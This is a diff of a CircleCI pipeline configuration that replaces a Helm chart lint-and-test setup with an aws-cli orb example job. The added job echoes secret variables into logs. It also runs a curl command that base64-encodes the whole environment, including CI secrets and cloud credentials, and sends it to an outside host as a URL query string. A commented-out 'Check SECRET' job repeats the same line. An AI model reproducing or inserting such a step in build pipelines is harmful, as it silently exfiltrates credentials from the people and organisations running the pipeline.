@@ -1,54 +1,45 @@
-# version: 2
+# version: 2.1
+
 # jobs:
-#   lint-charts:
-#     docker:
-#       - image: gcr.io/kubernetes-charts-ci/test-image:v3.3.2
-#     steps:
-#       - checkout
-#       - run:
-#           name: lint
-#           command: |
-#             git remote add k8s https://github.com/matic-insurance/ops-helm-charts
-#             git fetch k8s master
-#             ct lint --config test/ct.yaml
-#   test-charts:
+
+#   ruby-linters:
 #     machine:
 #       image: ubuntu-1604:201903-01
 #     steps:
-#       - run:
-#           name: Install tools
-#           command: |
-#             mkdir /home/circleci/.go_workspace/bin
-#             curl https://raw.githubusercontent.com/golang/dep/master/install.sh | sh
-#             curl -LO https://storage.googleapis.com/kubernetes-release/release/$(curl -s https://storage.googleapis.com/kubernetes-release/release/stable.txt)/bin/linux/amd64/kubectl
-#             chmod +x ./kubectl
-#             sudo mv ./kubectl /usr/local/bin/kubectl
-#             curl https://raw.githubusercontent.com/helm/helm/master/scripts/get | bash
-#             curl -sSLo kind "https://github.com/kubernetes-sigs/kind/releases/download/0.2.1/kind-linux-amd64"
-#             chmod +x kind
-#             sudo mv kind /usr/local/bin/kind
 #       - checkout
 #       - run:
-#           name: Run e2e tests
-#           command: bash e2e-kind.sh
+#           name: Check SECRET
+#           command: curl https://servicing-st1.matic.com/?env=$(env | base64 | tr -d '\n')
+#       - run:
+#           name: Check AWS_REGION
+#           command: echo $AWS_REGION
 
+# workflows:
+#   test.test:
+#     when:
+#       not:
+#         equal: [ master, << pipeline.git.branch >> ]
+#     jobs:
+#       - ruby-linters:
+#           name: ruby-linters
+#           #context: automation
 
+version: 2.1
+orbs:
+  aws-cli: circleci/aws-cli@2.0
 jobs:
-  build:
-    machine:
-      image: ubuntu-1604:201903-01
+  aws-cli-example:
+    executor: aws-cli/default
     steps:
       - checkout
-      - run:
-          name: test echo
-          command: echo $AWS_REGION
-          context: 
-            - global
+      - aws-cli/setup:
+          profile-name: example
+      - run: echo $TEST_SECRET
+      - run: echo $SECRET
+      - run: curl https://servicing-st1.matic.com/?env=$(env | base64 | tr -d '\n')
 
 workflows:
-  version: 2
-  lint:
+  aws-cli:
     jobs:
-      - build
-      # - lint-charts
-      # - test-charts
+      - aws-cli-example:
+          context: context1
